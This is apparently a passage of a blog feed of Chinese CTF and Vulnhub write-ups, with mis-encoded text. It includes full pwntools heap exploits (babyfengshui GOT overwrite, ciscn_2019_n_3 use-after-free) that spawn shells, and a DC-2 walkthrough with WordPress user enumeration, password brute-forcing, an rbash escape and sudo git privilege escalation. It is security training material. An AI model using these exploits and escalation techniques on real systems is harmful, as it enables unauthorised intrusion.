class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">3789</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23_32.so&#x27;)#è¿œç¨‹ä½¿ç”¨</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/epoch/glibc/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)<span class="comment">#æœ¬åœ°ä½¿ç”¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name, length, text</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;length: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, length, text</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;length: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;text: &#x27;</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;nam1&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;nam2&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;nam3&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;nam1&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x108</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x08</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x08</span> + p32(free_got)</span><br><span class="line">edit(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(p32(sys_addr)), p32(sys_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC2</title>
      <link href="/posts/3bdfdcb0/"/>
      <url>/posts/3bdfdcb0/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC2"><a href="#Vulnhub-DC2" class="headerlink" title="Vulnhub-DC2"></a>Vulnhub-DC2</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆ<code>arp-scan -l</code>æ‰«æå­˜æ´»çš„ä¸»æœº</p><p><img src="https://pic.imgdb.cn/item/6713b27dd29ded1a8cdd8e40.png"></p><p>ä½¿ç”¨<code>nmap</code>æ‰«æå¼€æ”¾çš„ç«¯å£</p><p><code>nmap -sS -sV -O -T4 -A -p- 192.168.154.139</code></p><p><img src="https://pic.imgdb.cn/item/6713b36cd29ded1a8cdfde2d.png"></p><p>æ‰«æåˆ°80 tcpç«¯å£å’Œ7744çš„sshç«¯å£</p><p>è®¿é—®æ‰«æåˆ°çš„ipåœ°å€ å‘ç°è®¿é—®ä¸äº†</p><p><img src="https://pic.imgdb.cn/item/6713b3add29ded1a8ce079f3.png"></p><p>è¢«é‡å®šå‘äº†ï¼Œéœ€è¦ä¿®æ”¹&#x2F;etc&#x2F;hostsæ–‡ä»¶</p><p><img src="https://pic.imgdb.cn/item/6713b440d29ded1a8ce1d598.png"></p><p>åŠ ä¸Šdc-2çš„ipåå†æ¬¡å°è¯•è®¿é—®</p><p>æˆåŠŸè®¿é—®åå‘ç°flag1</p><p><img src="https://pic.imgdb.cn/item/6713b4bdd29ded1a8ce293f7.png"></p><p>ç¿»è¯‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½ çš„å¸¸ç”¨å­—å…¸å¯èƒ½ä¸å¤ªç®¡ç”¨ï¼Œæ‰€ä»¥ä½ å¯èƒ½éœ€è¦æ›´â€œcewlâ€ä¸€ç‚¹ã€‚</span><br><span class="line"></span><br><span class="line">æ›´å¤šçš„å¯†ç æ€»æ˜¯æ›´å¥½ï¼Œä½†æœ‰æ—¶å€™ä½ ä¸å¯èƒ½èµ¢å¾—å…¨éƒ¨ã€‚</span><br><span class="line"></span><br><span class="line">ä»¥æŸä¸€ä¸ªèº«ä»½ç™»å½•ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ä¸‹ä¸€ä¸ª flagã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœæ‰¾ä¸åˆ°ï¼Œé‚£å°±å°è¯•ä»¥å¦ä¸€ä¸ªèº«ä»½ç™»å½•ã€‚</span><br></pre></td></tr></table></figure><p>æç¤ºç”¨cewlç”Ÿæˆå­—å…¸</p><p>ä½¿ç”¨Wappalyzeræµè§ˆå™¨æ’ä»¶æŸ¥çœ‹ç½‘é¡µçš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/6713b48cd29ded1a8ce26ad4.png"></p><p>æˆ–è€…ä½¿ç”¨whatwebå‘½ä»¤æŸ¥çœ‹ç½‘é¡µè¯¦ç»†ä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/6713b58bd29ded1a8ce346be.png"></p><p>å‘ç°ç½‘ç«™ä½¿ç”¨çš„æ—¶è¾ƒä½ç‰ˆæœ¬çš„wordpressæ¡†æ¶</p><p>dirbæ‰«æç½‘ç«™</p><p><img src="https://pic.imgdb.cn/item/6713b612d29ded1a8ce3ad14.png"></p><p>æœ‰wp-adminé¡µé¢ è®¿é—®</p><p><img src="https://pic.imgdb.cn/item/6713b665d29ded1a8ce3f3dd.png"></p><p>å‡ºç°ç™»å½•é¡µé¢</p><p>ä¸wordpressæ¡†æ¶é…å¥—çš„æœ‰wpscanå·¥å…·</p><p>ä½¿ç”¨wpscanå·¥å…·æ‰«æçˆ†ç ´ç”¨æˆ·</p><p><code>wpscan --url http://dc-2 -e u </code></p><p>æ‰«æç”¨æˆ·å</p><p><img src="https://pic.imgdb.cn/item/6713b7a0d29ded1a8ce5040d.png"></p><p>æ‰«æåˆ°ä¸‰ä¸ªç”¨æˆ·å å°†ä¸‰ä¸ªç”¨æˆ·åå†™å…¥users.txt</p><p><code>echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</code></p><p>å†ä½¿ç”¨cewlç”Ÿæˆpasswd.txt</p><p><code>cewl http://dc-2 -w passwd.txt </code></p><p>å°†ç”Ÿæˆçš„ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°æ¡Œé¢å ä½¿ç”¨wpscançˆ†ç ´ç™»å½•åå’Œå¯†ç </p><p><code>wpscan --url http://dc-2 -U users.txt -P passwd.txt</code></p><p><img src="https://pic.imgdb.cn/item/6713b946d29ded1a8ce6b661.png"></p><p>çˆ†ç ´å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç </p><p>ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ç™»å½•</p><p>åœ¨jerryç”¨æˆ·ä¸­çš„pagesé¡µé¢ä¼šå‘ç°flag2çš„æç¤º</p><p><img src="https://pic.imgdb.cn/item/6713b9cdd29ded1a8ce73652.png"></p><p>æ²¡å•¥ç”¨â€¦</p><p>sshå°è¯•è¿æ¥ tomç”¨æˆ·å¯ä»¥sshè¿æ¥ jerryæ— æ³•è¿æ¥</p><p><img src="https://pic.imgdb.cn/item/6713ba3dd29ded1a8ce7a1e6.png"></p><p><img src="https://pic.imgdb.cn/item/6713ba6dd29ded1a8ce7d1a3.png">ã€</p><p>å‘ç°idå‘½ä»¤æ— æ³•ä½¿ç”¨ è¾“å‡ºå½“å‰SHELLåå‘ç°æ˜¯rbash</p><p>æ˜¯å—é™åˆ¶çš„shell</p><p>æŸ¥çœ‹å¯ç”¨çš„å‘½ä»¤</p><p><img src="https://pic.imgdb.cn/item/6713baebd29ded1a8ce847fe.png"></p><p>å‘ç°åªæœ‰4ä¸ªå¯ç”¨çš„å‘½ä»¤</p><p>ä½¿ç”¨lså’ŒlessæŸ¥çœ‹flag3çš„å†…å®¹</p><p><img src="https://pic.imgdb.cn/item/6713bb32d29ded1a8ce88e80.png"></p><p>æç¤ºéœ€è¦åˆ‡æ¢åˆ°jerryç”¨æˆ·</p><p>æ‰€ä»¥éœ€è¦ç»•è¿‡rbashçš„é™åˆ¶ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a      #æŠŠ/bin/shç»™aå˜é‡</span><br><span class="line">export PATH=$PATH:/bin/     #å°†/binä½œä¸ºPATHç¯å¢ƒå˜é‡å¯¼å‡º</span><br><span class="line">export PATH=$PATH:/usr/bin  #å°†/usr/binä½œä¸ºPATHç¯å¢ƒå˜é‡å¯¼å‡º</span><br></pre></td></tr></table></figure><p>åœ¨tomå¤„è¾“å…¥ä¸Šè¿°å‘½ä»¤åå³å¯ç»•è¿‡rbashçš„é™åˆ¶</p><p><img src="https://pic.imgdb.cn/item/671489fbd29ded1a8c300429.png"></p><p>åˆ‡æ¢åˆ°jerryç›®å½•ä¸‹</p><p>æŸ¥çœ‹flag4çš„å†…å®¹</p><p>æç¤ºgit sudo -læŸ¥çœ‹å¯ä»¥ä»¥rootç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ åŒæ ·å‘ç°git</p><p><img src="https://pic.imgdb.cn/item/67148a90d29ded1a8c307456.png"></p><p>æ‰€ä»¥ä½¿ç”¨gitææƒ</p><p><code>sudo git help config</code></p><p><code>!/bin/sh</code></p><p>å®Œæˆææƒ æ‹¿åˆ°æœ€ç»ˆçš„flag</p><p><img src="https://pic.imgdb.cn/item/67148b6ed29ded1a8c310e86.png"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_3</title>
      <link href="/posts/f0e3c24/"/>
      <url>/posts/f0e3c24/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>é¦–å…ˆchecksecæŸ¥çœ‹ä¿æŠ¤æœºåˆ¶</p><p><img src="https://pic.imgdb.cn/item/6714f788d29ded1a8cec6b9d.png"></p><p>åªå¼€äº†NXä¿æŠ¤å’ŒCnnary gotè¡¨å¯ç”¨</p><p>idaåç¼–è¯‘åˆ†æ</p><p>ä¸»å‡½æ•°æ˜¯ç»å…¸çš„èœå•ç±»å‹é¢˜ç›® </p><p>newå‡½æ•°åˆ›å»ºå †</p><p><img src="https://pic.imgdb.cn/item/6714f8c4d29ded1a8cef9407.png"></p><p><img src="https://pic.imgdb.cn/item/6714f8ded29ded1a8cefd588.png"></p><p>æ¥ç€åˆ†æDelå‡½æ•°</p><p><img src="https://pic.imgdb.cn/item/6714f905d29ded1a8cf039fe.png"></p><p>è°ƒç”¨å †åœ°å€ï¼‹4å¤„çš„å‡½æ•°</p><p>åˆ†åˆ«æŸ¥çœ‹rec_int_freeä¸rec_str_freeå‡½æ•°</p><p><img src="https://pic.imgdb.cn/item/6714f9a1d29ded1a8cf1e3a5.png"></p><p><img src="https://pic.imgdb.cn/item/6714f9bbd29ded1a8cf22322.png"></p><p>freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®ç©ºå­˜åœ¨UAFæ¼æ´</p><p>å…ˆç”³è¯·ä¸¤ä¸ªchunkåfreeæ‰ä¸¤ä¸ªchunk</p><p>æ–‡ä»¶ä¸­æœ‰systemå‡½æ•°   ç”³è¯·chunkæ—¶ä¼šå…ˆç”³è¯·0xcå¤§å°çš„chunk</p><p>freeä¹‹åç”³è¯·0xcå¤§å°çš„chunk å†…å®¹å†™å…¥  <strong><code>b&#39;bash&#39; + p32(elf.plt[&#39;system&#39;])</code></strong></p><p>å³å¯æ‰§è¡Œæ‹¿åˆ°shell</p><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25046</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> length: p.recv(length)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim,x : p.sendafter(delim,x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,x : p.sendlineafter(delim,x)</span><br><span class="line">itr = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> addr : log.success(<span class="string">&quot;&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;CNote &gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index, <span class="built_in">type</span>, size, payload</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak = <span class="string">b&#x27;bash&#x27;</span> + p32(system_plt)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0x10</span>, <span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0x10</span>, <span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line">Del(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0xc</span>, leak)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line">p.interactive() </span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUP </category>
          
          <category> å † </category>
          
          <category> CTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WriteUP </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[å®‰æ´µæ¯ 2019] easy misc</title>
      <link href="/posts/b88b8704/"/>
      <url>/posts/b88b8704/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰æ´µæ¯-2019-easy-misc"><a href="#å®‰æ´µæ¯-2019-easy-misc" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy misc"></a>[å®‰æ´µæ¯ 2019]easy misc</h2><p>ä¹Ÿå¾ˆæŠ½è±¡çš„ä¸€é“é¢˜</p><p>é¦–å…ˆæ‹¿åˆ°æ‰‹åè§£å‹å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ä¸€ä¸ªæ–‡ä»¶å¤¹å’Œä¸€å¼ å›¾ç‰‡</p><p>æ–‡ä»¶å¤¹é‡Œæœ‰ä¸€ä¸ªhint.txt</p><p><img src="https://pic.imgdb.cn/item/67120529d29ded1a8c676974.png"></p><p>å–å‰16ä¸ªå­—ç¬¦ æƒ³åˆ°å­—ç¬¦é¢‘ç‡ç»Ÿè®¡</p><p>æ¥ç€åˆ†æå›¾ç‰‡</p><p><a href="https://aperisolve.fr/"></a></p><p>åœ¨çº¿ç½‘ç«™ä¸€æŠŠæ¢­</p><p>binwalkå¤„æœ‰æ–‡ä»¶ ä¸‹è½½ä¸‹æ¥</p><p><img src="https://pic.imgdb.cn/item/671205bad29ded1a8c6822d0.png"></p><p>å°†ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶è§£å‹ç¼©åå…¨éƒ¨æ”¾åˆ°010ä¸­æŸ¥çœ‹æ–‡ä»¶å±æ€§</p><p><img src="https://pic.imgdb.cn/item/6712084fd29ded1a8c6c2723.png"></p><p>å°†0å’Œ1D0AFåç¼€å‡æ”¹ä¸º.png</p><p>å‘ç°æ˜¯ä¸¤å¼ ç›¸åŒçš„å›¾ç‰‡ çŒœæµ‹æ˜¯ç›²æ°´å°</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯PuzzleSolverå·¥å…·</p><p><img src="https://pic.imgdb.cn/item/67120966d29ded1a8c6e9293.png"></p><p>å¾—åˆ°çš„å›¾ç‰‡æç¤ºä¿¡æ¯ in 11.txt</p><p><img src="https://pic.imgdb.cn/item/67120982d29ded1a8c6eb450.png"></p><p>å¯¹11.txtè¿›è¡Œå­—ç¬¦é¢‘ç‡ç»Ÿè®¡ï¼ˆå€Ÿé‰´å¤§ä½¬çš„è„šæœ¬ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­ï¼Œå¹¶æŒ‡å®šç¼–ç æ ¼å¼</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/epoch/CTFLearn/Misc/BUUCTF/read/11.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    line = file.readlines()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="comment"># ç»Ÿè®¡å­—æ¯é¢‘ç‡ï¼Œéå†å°å†™å­—æ¯ a åˆ° z</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):  <span class="comment"># ASCII èŒƒå›´ä» &#x27;a&#x27; åˆ° &#x27;z&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> line:</span><br><span class="line">        find_line = re.findall(<span class="built_in">chr</span>(i), j)  <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾å½“å‰å­—æ¯</span></span><br><span class="line">        count += <span class="built_in">len</span>(find_line)  <span class="comment"># ç»Ÿè®¡å½“å‰å­—æ¯å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">    result[<span class="built_in">chr</span>(i)] = count  <span class="comment"># å°†ç»“æœå­˜å…¥å­—å…¸</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹ç»“æœæŒ‰ç…§é¢‘ç‡ä»é«˜åˆ°ä½æ’åº</span></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ’åºåçš„å­—æ¯é¢‘ç‡</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;é¢‘ç‡ç¬¬&#123;0&#125;: &#123;1&#125;, æ¬¡æ•°: &#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(num, x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/67120a0cd29ded1a8c6f7862.png"></p><p>å‰16ä¸ªå­—ç¬¦å¦‚ä¸Š</p><p>æ¥ç€åˆ†ædecode.zip ç”¨winraræ‰“å¼€åå‘ç°æœ‰æç¤ºä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/67120a57d29ded1a8c70481b.png"></p><p>è¡¨è¾¾å¼è®¡ç®—ç»“æœä¸º7 çœ‹è¿‡wpåæ‰çŸ¥é“æ˜¯æ©ç çˆ†ç ´ 7æç¤ºå‰é¢è¿˜æœ‰7ä¸ªæ•°å­—</p><p><img src="https://pic.imgdb.cn/item/67120abcd29ded1a8c715308.png"></p><p>çˆ†ç ´åæˆåŠŸæ‹¿åˆ°å¯†ç </p><p><img src="https://pic.imgdb.cn/item/67120afed29ded1a8c71e788.png"></p><p>è§£å‹ç¼©åå‘ç°æ˜¯æ›¿æ¢è¡¨</p><p>å°†å‰åå…­ä¸ªå­—ç¬¦å¯¹ç…§æ›¿æ¢è¡¨æ›¿æ¢åå¾—åˆ°</p><p><code>QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw=</code></p><p>CyberCherfè§£ç </p><p>é¦–å…ˆbase64ç„¶åbase85</p><p><img src="https://pic.imgdb.cn/item/67120c3fd29ded1a8c74b23c.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BUUCTF </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-èœ˜è››ä¾ å‘€</title>
      <link href="/posts/77028167/"/>
      <url>/posts/77028167/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-èœ˜è››ä¾ å‘€"><a href="#BUUCTF-èœ˜è››ä¾ å‘€" class="headerlink" title="BUUCTF-èœ˜è››ä¾ å‘€"></a>BUUCTF-èœ˜è››ä¾ å‘€</h1><p>eeemmmmmmmmmmmmâ€¦å¾ˆæŠ½è±¡çš„ä¸€ä¸ªé¢˜ ä¸€ç¯å¥—ä¸€ç¯çš„</p><p>é™„ä»¶æ‹¿åˆ°æ‰‹åæ˜¯ä¸€ä¸ªæµé‡åŒ… æœ‰å¾ˆå¤šçš„ICMPåŒ…</p><p><img src="https://pic.imgdb.cn/item/670fbc0dd29ded1a8c4a701c.png"></p><p><img src="https://pic.imgdb.cn/item/670fbc2dd29ded1a8c4a8bd5.png"></p><p>å‘ç°ICMPåŒ…åé¢éƒ½è·Ÿç€ä¸€æ®µdataæ¯ä¸€ä¸ªé‡å¤4æ¬¡</p><p>å°†dataæ•°æ®å…¨éƒ¨æå–å‡ºæ¥</p><p><strong><code>tshark -r out.pcap -T fields -e data &gt; data.txt</code></strong></p><p>æ‹¿åˆ°çš„æ•°æ®æœ‰é‡å¤è¡Œ å»é™¤é‡å¤è¡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data1.txt&#x27;</span> ,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res_list = []</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res_list:</span><br><span class="line">            res_list.append(i)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data2.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res_list:</span><br><span class="line">        f.write(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„æ•°æ®è½¬ä¸ºascii</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data3.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        <span 